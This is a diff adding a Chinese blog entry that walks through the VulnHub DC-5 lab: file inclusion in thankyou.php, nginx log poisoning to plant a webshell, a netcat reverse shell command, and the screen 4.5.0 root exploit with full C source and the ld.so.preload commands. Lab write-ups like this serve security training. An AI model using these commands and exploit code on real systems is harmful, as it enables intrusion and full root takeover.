@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>vulbhub-DC5</title>
+      <link href="/2020/11/11/vulbhub-DC5/"/>
+      <url>/2020/11/11/vulbhub-DC5/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><h1 id="阶段一：信息收集"><a href="#阶段一：信息收集" class="headerlink" title="阶段一：信息收集"></a>阶段一：信息收集</h1><p>我们在配置好靶场文件之后运行靶场，利用namp发现靶机开启了80和111端口，</p><p><a href="https://imgchr.com/i/BvA8Jg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvA8Jg.png" alt></a></p><p>111端口的用处如下：</p><p>111端口是baiSUN公司的RPC服务du所有端口，常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd。（摘自百度知道，虽然我也不知道这些服务是干啥的），总而言之，我们对这个靶场的渗透还是从80端口开始的，通过IP访问，可以访问到以下界面</p><p><a href="https://imgchr.com/i/BvADFU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvADFU.png" alt></a></p><p>在看过每个页面之后，我门可以发现我们在contact处在点击提交之后，会发现相仿Copyright的标志会发生变化，在看过别人的wp之后知道这里存在一个文件包含，所以直接测试一波，</p><p><a href="https://imgchr.com/i/BvAcl9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAcl9.png" alt></a></p><p>可以看到确实存在文件包含，所以再利用文件包含查看源代码具体看一下是怎样的包含，将显示出的字符串base64解密一下，</p><p><a href="https://imgchr.com/i/BvAIYD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAIYD.png" alt></a></p><h1 id="阶段二：前渗透阶段"><a href="#阶段二：前渗透阶段" class="headerlink" title="阶段二：前渗透阶段"></a>阶段二：前渗透阶段</h1><p><a href="https://imgchr.com/i/BvAqOI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAqOI.png" alt></a></p><p>可以看到这里对于文件包含并没有做出防护措施，所以直接利用这个漏洞来包含一句话木马</p><p><a href="https://imgchr.com/i/BvAztS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAztS.png" alt></a></p><p>在包含之后再利用包含查看服务器端的日志文件</p><p><code>shell</code></p><p><a href="http://192.168.1.170/thankyou.php?file=/var/log/nginx/access.log" target="_blank" rel="noopener">http://192.168.1.170/thankyou.php?file=/var/log/nginx/access.log</a></p><p><a href="https://imgchr.com/i/BvEQXR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEQXR.png" alt></a></p><p>日志记录已经包含成功</p><p><a href="https://imgchr.com/i/BvEZkT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEZkT.png" alt></a></p><p>利用蚁剑连接</p><p><a href="https://imgchr.com/i/BvE30x" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvE30x.png" alt></a></p><p>在执行反弹shell</p><p><code>shell</code></p><pre><code>nc  -e  /bin/bash  192.168.220.142    7744           //反弹shell到7744端口</code></pre><p><a href="https://imgchr.com/i/BvEOgJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEOgJ.png" alt></a></p><p>在接受到反弹shell之后利用python实现交互式shell</p><p><code>shell</code></p><pre><code>nc -lvvp 7744                       //端口监听python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;         //实现交互式shell</code></pre><p><a href="https://imgchr.com/i/BvVpE6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvVpE6.png" alt></a></p><h1 id="阶段三：后渗透阶段"><a href="#阶段三：后渗透阶段" class="headerlink" title="阶段三：后渗透阶段"></a>阶段三：后渗透阶段</h1><p>在拿到shell之后我们就要想到怎么提权了，先利用命令查看能够执行root权限的文件，</p><p><code>shell</code></p><p>find / -perm /4000 2&gt;/dev/null</p><p><a href="https://imgchr.com/i/BvVfPO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVfPO.png" alt></a></p><p>发现了screen4.5.0，然后在msf中search一波，发现有screen4.5.0的exp，</p><p><a href="https://imgchr.com/i/BvVbZt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVbZt.png" alt></a></p><p>copy一手41154.sh，再cat一下，（41154.sh是不能直接进行编译的）</p><p>这里我看了很wp最后发现是需要我们创建两个c语言文件，然后将这两个文件进行编译之后产生的新文件通过蚁剑上传到靶机，其中libhax.c的代码如下：</p><p><a href="https://imgchr.com/i/BvVjJS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVjJS.png" alt></a></p><p><code>c</code></p><p>#include &lt;stdio.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;unistd.h&gt;<br><strong>attribute</strong> ((<strong>constructor</strong>))<br>void dropshell(void){<br>    chown(“/tmp/rootshell”, 0, 0);<br>    chmod(“/tmp/rootshell”, 04755);<br>    unlink(“/etc/ld.so.preload”);<br>    printf(“[+] done!\n”);<br>}</p><p>然后命令行上执行：</p><p><code>shell</code></p><p>gcc -fPIC -shared -ldl -o libhax.so libhax.c</p><p>rootshell.c的代码如下：</p><p><a href="https://imgchr.com/i/BvZ9Ln" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZ9Ln.png" alt></a></p><p><code>cpp</code></p><p>#include &lt;stdio.h&gt;<br>int main(void){<br>    setuid(0);<br>    setgid(0);<br>    seteuid(0);<br>    setegid(0);<br>    execvp(“/bin/sh”, NULL, NULL);<br>}</p><p>然后执行以下命令：</p><p><code>shell</code></p><p>gcc -o rootshell rootshell.c</p><p>注意：这两个文件一定要进行编译，而在进行编译之后会产生两个同名的文件，而我们真正的提权工具就是这两个新产生的文件。</p><p>然后将两个文件通过蚁剑上传到靶机上的/tmp下，</p><p><a href="https://imgchr.com/i/BvZid0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZid0.png" alt></a></p><p>然后在我们的交互式shell窗口cd到/tmp/etc下执行以下命令：</p><p><code>shell</code></p><pre class=" language-javascript"><code class="language-javascript">cd <span class="token operator">/</span>tmp<span class="token operator">/</span>etc                    <span class="token comment" spellcheck="true">//转到tmp下的etc文件中</span>umask <span class="token number">000</span>                       screen <span class="token operator">-</span>D <span class="token operator">-</span>m <span class="token operator">-</span>L ld<span class="token punctuation">.</span>so<span class="token punctuation">.</span>preload echo <span class="token operator">-</span>ne  <span class="token string">"\x0a/tmp/libhax.so"</span>           <span class="token comment" spellcheck="true">//构造exp</span><span class="token operator">/</span>tmp<span class="token operator">/</span>rootshell          <span class="token comment" spellcheck="true">//实现提权</span></code></pre><p><a href="https://imgchr.com/i/BvZVWF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZVWF.png" alt></a></p><p>然后进入到root目录下查看flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>vulbhub-DC2</title>
       <link href="/2020/11/05/vulbhub-DC2/"/>
       <url>/2020/11/05/vulbhub-DC2/</url>
